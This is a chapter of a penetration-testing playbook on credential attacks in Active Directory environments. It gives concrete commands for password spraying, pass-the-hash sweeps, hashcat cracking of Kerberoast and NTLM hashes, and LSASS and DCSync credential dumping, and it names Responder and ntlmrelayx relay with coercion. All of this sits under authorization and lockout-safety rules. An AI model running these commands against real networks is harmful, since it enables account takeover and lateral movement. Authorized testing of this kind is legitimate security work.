# 20 — Credential Testing & Analysis

> **Objective:** obtain, validate, and reuse credentials to expand access — while rigorously
> avoiding account lockouts, service disruption, and unnecessary detection.
> **Risk:** this chapter contains the most **RoE-gated** techniques in the playbook. Read the
> lockout section before anything else.

## WHY credentials are the engine

Modern networks fall to *credentials*, not memory-corruption exploits. One password reused, one
weak service account, one crackable Kerberoast hash → domain compromise. But credential attacks
are also the easiest way to **lock out real users** and **page the SOC** — so discipline here is
everything.

## Lockout safety FIRST (read before any guessing)

```
BEFORE any spray/guess:
  1. Obtain the lockout policy (threshold, observation window, duration).
     nxc smb <dc> -u <u> -p <p> --pass-pol     (or from GPO / client)
  2. Compute a SAFE budget: attempts-per-account-per-window < (threshold - 1),
     and leave margin for the user's own logins.
  3. Confirm spraying is authorized in writing.
```

| Technique | Lockout risk | Default stance |
|-----------|--------------|----------------|
| Testing ONE known-good credential | none | SAFE/CONTROLLED |
| Password **spraying** (1 pass × many users, paced) | yes if careless | **REQUIRES EXPLICIT RoE APPROVAL** |
| **Brute force** (many pass × one user) | high | **FORBIDDEN by default** |
| Offline hash cracking (Kerberoast/AS-REP/NTDS/shadow) | **none** (offline) | SAFE |
| Pass-the-Hash / Pass-the-Ticket with owned creds | none (no guessing) | CONTROLLED |

**Rule of thumb:** prefer **offline** (crack what you captured) and **reuse** (use what you own)
over **online guessing**. Offline attacks have zero lockout risk.

## Credential sources (harvest map)

| Source | How | Chapter |
|--------|-----|---------|
| Readable SMB shares (GPP cpassword, scripts, configs) | nxc spider / gpp_password | §06/§07 |
| LDAP description fields / attributes | ldapsearch | §07 |
| Kerberoast (service account TGS) | GetUserSPNs → crack | §07 |
| AS-REP roast (no-preauth users) | GetNPUsers → crack | §07 |
| Local SAM / LSA / cached / LSASS | secretsdump / pypykatz | §08 |
| DCSync (NTDS hashes) | secretsdump w/ rights | §07 |
| Linux shadow / keys / .env / history | §09 loot | §09 |
| App/DB configs (web.config, wp-config, .env) | file read | §10/§16 |
| LAPS (if readable) | nxc -M laps | §07 |
| Browser/DPAPI vaults | SharpDPAPI | §08 |

## Offline cracking

```bash
hashcat -m 13100 kerberoast.hash wordlist.txt -r rules/best64.rule   # Kerberoast (RC4)
hashcat -m 18200 asrep.hash wordlist.txt                              # AS-REP
hashcat -m 1000  ntlm.hash  wordlist.txt -r rules/...                 # NTLM
hashcat -m 1800  shadow.hash wordlist.txt                             # sha512crypt
```
Offline = zero lockout/detection on the target. Crack on your own machine. Cracked passwords →
test for reuse (below). Store cracked values in `loot/`, never the repo.

## Reuse & spraying

```bash
# Credential REUSE (owned creds across hosts) — no guessing, CONTROLLED:
nxc smb <subnet> -u <user> -p <pass> --continue-on-success        # where does it work?
nxc smb <subnet> -u <localadmin> -H <nthash> --local-auth         # Pass-the-Hash sweep

# Password SPRAY — RoE-GATED, paced, policy-aware:
# ONE password, many users, ONE attempt, then WAIT a full lockout window before the next.
nxc smb <dc> -u users.txt -p 'Season2026!' --continue-on-success  # only with approval + policy
kerbrute passwordspray -d acme.local --dc <dc> users.txt 'Season2026!'  # quieter (Kerberos)
```

**Spray discipline:** 1 password per round, pace ≥ lockout window, exclude already-locked or
service accounts, run during agreed hours, and **stop at first success** for that account.

## Pass-the-Hash / Pass-the-Ticket / Overpass-the-Hash

| Technique | Tool | Note |
|-----------|------|------|
| PtH (NTLM) | `nxc ... -H <hash>`, `impacket-psexec -hashes` | uses owned hash; no guessing |
| PtT | `export KRB5CCNAME=…; impacket-* -k -no-pass` | uses captured ticket |
| OPtH | Rubeus/getTGT | hash → TGT |

These are CONTROLLED (you already own the secret). `psexec`-style exec is **noisier/EDR-visible**
→ prefer WinRM (§15) or wmiexec; log as §24 detection events.

## LLMNR/NBT-NS/mDNS poisoning & NTLM relay (high power, high risk)

```
Responder (poisoning mode)  → captures NetNTLMv2 hashes via name-resolution spoofing
ntlmrelayx + coercion (PetitPotam/PrinterBug) → relay auth to SMB/LDAP/ADCS
```
**ALL of the above are REQUIRES EXPLICIT RoE APPROVAL:** they are active MITM, can disrupt name
resolution for real users, and can create accounts/certs. If approved: time-box, target
specific hosts, use `-A` (analyze) first to understand traffic, and document everything for §24.

## Secret-handling rules
- **Never commit secrets.** `loot/` is gitignored. CSV trackers hold only a *reference*:
  `credentials.csv → secret_ref=loot/creds/ACME-SRV-014-mssql.txt`.
- Encrypt `loot/` at rest; destroy per RoE retention after report delivery.

## Decision flow
```
hash captured → crack offline → reuse-sweep → new access → re-run BloodHound (§07)
cred owned → nxc sweep → (Pwn3d!) hosts → §21 lateral / §08 dump more creds
spray needed → is it approved + policy known? → no: STOP (report weak-policy exposure instead)
cred grants DCSync/DA → §07 Level D/E → prove impact → STOP escalating
```

## Evidence
`credentials/credentials.csv` (refs only), crack logs (`loot/`), nxc sweep output showing where
creds work, screenshots of `(Pwn3d!)`. For spraying: the approval reference, the exact pacing,
and the SOC-notification timestamp.
